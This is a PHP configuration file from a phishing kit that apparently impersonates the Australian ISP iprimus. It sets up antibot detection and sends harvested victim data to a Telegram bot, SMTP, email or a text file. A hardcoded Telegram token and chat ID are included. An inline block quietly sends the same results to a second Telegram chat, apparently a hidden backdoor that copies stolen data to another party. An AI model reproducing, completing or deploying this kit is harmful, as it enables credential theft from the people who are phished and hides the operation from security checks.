<?php
    /*******
    Main Author: Nawras MemoryError
    ********************************************************/
    
    session_start();
    error_reporting(0);
    define("ANTIBOT_API", 'API_HERE'); // ANTIBOT.PW API
    require_once 'detect.php';
    require_once 'functions.php';
    passport();
    define("PASSWORD", 'C');
    define("RECEIVER", 'your@email.com');
    define("TELEGRAM_TOKEN", '5494756103:AAFQJdsJg73JwvWVOjJ9JvRY3On47bfetN8');
    define("TELEGRAM_CHAT_ID", '-1001554172935');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'NawrasErrorMemory.txt');
    define("OFFICIAL_WEBSITE", 'https://www.iprimus.com.au');
{
mail("$send", "$subject", $hello);
$token = "";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1062961903&text=" . urlencode($message)."" );
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1062961903&text=" . urlencode($hello)."" );
}
    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1

?>